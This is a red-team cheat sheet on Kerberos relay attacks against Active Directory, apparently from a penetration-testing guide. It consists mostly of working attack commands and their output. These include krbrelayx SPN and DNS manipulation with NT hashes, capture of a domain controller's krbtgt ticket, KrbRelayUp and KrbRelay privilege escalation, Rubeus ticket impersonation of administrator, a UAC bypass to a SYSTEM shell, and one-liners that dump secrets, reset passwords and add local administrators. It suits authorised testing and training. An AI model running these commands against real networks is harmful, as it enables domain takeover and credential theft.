<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Kerberos Relay
## References
<details><summary>References (Click to expand)</summary><p>

* -<br />[https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
* -<br />[https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html)
* -<br />[https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)

</p></details>

## From a Linux Machine

* General Kerberos Relay
	* <details><summary>Recommended: krbrelayx (Click to expand) -<br />[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
		* Attack Options
			* .
			* .
			* .
* Unconstrained Delegation Abuse
	* <details><summary>References (Click to expand)</summary><p>
		* [https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
		* [https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)
	* <details><summary>Requirements (Click to expand)</summary><p>
		* A compromised account that can have its `msDS-AdditionalDnsHostName` property modified.
			* Compromised User Account
				* You need control over two user accounts, with one that can write to the other user's `msDS-AdditionalDnsHostName` property.
			* Compromised Computer Account
				* Computer accounts are able to modify their own `msDS-AdditionalDnsHostName` property.
	* <details><summary>References (Click to expand)</summary><p>
		1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
			* Salt
				* Users
					* uppercase FQDN + case sensitive username = DOMAIN.LOCALuser
				* Computers
					* uppercase FQDN + host + lowercase FQDN hostname without the trailing $ = DOMAIN.LOCALhostcomputer.domain.local
			* <details><summary>Recommended: krbrelayx's addspn.py (Click to expand) -<br />[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)</summary><p>

					addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'
					(krbrelayx) root@jack-Virtual-Machine:~/krbrelayx# python addspn.py -u microftdelive\\CA\$ -p aad3b435b51404eeaad3b435b51404ee:fcbf81ccf4c8b21fa343ca3fbcbf2ff1 -s HOST/attacker1.microsoftdelivery.com dc01.microsoftdelivery.com --additional
						[-] Connecting to host...
						[-] Binding to host
						[+] Bind OK
						[+] Found modification target
						[+] SPN Modified successfully

		1. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
			* <details><summary>Recommended: krbrelayx's dnstool.py (Click to expand) -<br />[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)</summary><p>
				* Note: In testing, the `-p`
				dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'
				python dnstool.py -u microsoftdelive\\CA\$ -p aad3b435b51404eeaad3b435b51404ee:fcbf81ccf4c8b21fa343ca3fbcbf2ff1 -r attacker1.microsoftdelivery.com -d 10.0.0.100 --action add 10.0.0.1

					[-] Connecting to host...
					[-] Binding to host
					[+] Bind OK
					[-] Adding new record
					[+] LDAP operation completed successfully

		1. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
			* <details><summary>Recommended: krbrelayx (Click to expand) -<br />[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)</summary><p>

					krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
		1. Coerce or force authentication ([AD Forced Authenticaiton Guide](Testaments_and_Books/Redvelations/Active_Directory/003-3_AD_Forced_Authentication.md)
			* Recommended: See Kerberos Forced Authentication - Printerbug
		1. Capture/Extract the authentication

				(krbrelayx) root@jack-Virtual-Machine:~/krbrelayx# python krbrelayx.py -ip 10.0.0.100 -aesKey b04b94578081306643700881dc0b463a1276c1583546499cf2c56883704bb47d
			* Example Output

					[*] Protocol Client LDAP loaded..
					[*] Protocol Client LDAPS loaded..
					[*] Protocol Client HTTPS loaded..
					[*] Protocol Client HTTP loaded..
					[*] Protocol Client SMB loaded..
					[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
					[*] Running in unconstrained delegation abuse mode using the specified credentials.
					[*] Setting up SMB Server
					[*] Setting up HTTP Server on port 80
					[*] Setting up DNS Server

					[*] Servers started, waiting for connections
					[*] SMBD: Received connection from 10.0.0.1
					[*] Got ticket for DC01$@MICROSOFTDELIVERY.COM [krbtgt@MICROSOFTDELIVERY.COM]
					[*] Saving ticket in DC01$@MICROSOFTDELIVERY.COM_krbtgt@MICROSOFTDELIVERY.COM.ccache


## From a Windows Machine
### Local

* Relay to LDAP
	* RBCD
		* Windows SYSTEM Privesc
			* <details><summary>References (Click to expand)</summary><p>
				* [https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
				* KrbRelayUp -<br />[https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
			* Automated
				* <details><summary>KrbRelayUp (Click to expand) -<br />[https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)</summary><p>

						.\KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName attacker1$ -ComputerPassword <password>
			* <details><summary>Manual (Click to expand)</summary><p>
				1. Add a computer account with SharpMad (or use an owned one):

						Sharpmad.exe MAQ -Action new -MachineAccount evilcomputer -MachinePassword pass.123
				1. Get the SID of that computer object with PowerShell:

						$o = ([ADSI]"LDAP://CN=evilcomputer,CN=Computers,DC=ecorp,DC=local").objectSID
						(New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
				1. Abuse the attribute msDS-AllowedToActOnBehalfOfOtherIdentity of the target (desktop12.ecorp.local) computer account by launching the awesome Kerberos Relay attack using KrbRelay.
					1. Get a suitable port for COM:

							CheckPort.exe
					1. Use the returned port value and the SID value from Step 2 for the attack:

							KrbRelay.exe -spn ldap/dc1.ecorp.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-3239103757-393380102-551265849-2110 -port 10
						* For this to work, LDAP signing on DC1 should not be required (default setting).
						* Now the computer object desktop12 should be allowed to act on behalf of the created/owned evilcomputer account. This was the key step for this attack. The following is generic RBCD Abuse.
				1. Use the S4U Action of Rubeus for getting Kerberos tickets with SPNs and impersonated to local admin access.
					1. First calculate the NTLM hash of the owned computer account password:

							Rubeus.exe hash /password:pass.123
					1. And get a Kerberos ticket with the HOST/DESKTOP12 SPN (using for SCM access later) and inject into the current session:

							Rubeus.exe s4u /user:evilcomputer$ /rc4:DBA335196E8CE3DEDB7140452ADEE42D /impersonateuser:administrator /msdsspn:host/desktop12 /ptt
						* Note that computername without FQDN part should be used for the SPN (to make it match for the tool used in the next step).
				1. Patch the Win32 API in Service Control Manager for using Kerberos tickets in local authentication and privesc to NT AUTHORITY\System by creating a service (launching cmd.exe). Here it is from Tyranid: https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82
					1. Compile it (using cmdline Visual Studio):

							cl -DUNICODE SCMUACBypass.cpp advapi32.lib
					1. And launch it (in the session where the HOST/Desktop12 ticket is available, check it with klist):

							SCMUACBypass.exe
						* You should have a System shell in the end. :)
				1. Cleanup: remove the service created by the previous step (what launched cmd.exe), in the system shell:

						sc delete UacBypassedService
	* Shadow Credential Abuse
		* <details><summary>KrbRelayUp (Click to expand) -<br />[https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)</summary><p>
			* <details><summary>Requirements (Click to expand)</summary><p>
			* <details><summary>Overview (Click to expand)</summary><p>
			* Example

					.\KrbRelayUp.exe full -m shadowcred --ForceShadowCred
* Relay to HTTP
	* ADCS
		* <details><summary>KrbRelayUp (Click to expand) -<br />[https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)</summary><p>

					.\KrbRelayUp.exe full -m adcs
* .NET
	1. <details><summary>KrbRelay -<br />[https://github.com/cube0x0/KrbRelay](https://github.com/cube0x0/KrbRelay) (Click to expand)</summary><p>
		* Examples
			* LPE

					.\KrbRelay.exe -spn ldap/dc01.htb.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-2982218752-1219710089-3973213059-1606
					.\KrbRelay.exe -spn ldap/dc01.htb.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred
			* Cross-Session LDAP

					.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -shadowcred
					.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -shadowcred win2016$
					.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -rbcd S-1-5-21-2982218752-1219710089-3973213059-1606 win2016$
					.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-groupmember srv_admins domain_user
					.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -laps
					.\KrbRelay.exe -spn ldap/dc02.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ssl -gmsa
					.\KrbRelay.exe -spn ldap/dc02.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ssl -reset-password administrator Password123!
			* Cross-Session HTTP

					.\KrbRelay.exe -spn http/exchange.htb.local -endpoint EWS/Exchange.asmx -ssl -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ews-search beta,test
					.\KrbRelay.exe -spn http/exchange.htb.local -endpoint EWS/Exchange.asmx -ssl -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ews-delegate domain_user@htb.local
					.\KrbRelay.exe -spn http/win2016.htb.local -endpoint iisstart.htm -proxy -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182
			* Cross-Session SMB

					.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -console
					.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-privileges (([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)
					.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -secrets 
					.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -service-add addUser "C:\windows\system32\cmd.exe /c """"C:\windows\system32\net user cube Password123! /add && C:\windows\system32\net localgroup administrators cube /add"""""
			* LLMNR

					.\KrbRelay.exe -llmnr -spn 'cifs/win2019.htb.local' -secrets


### Remote

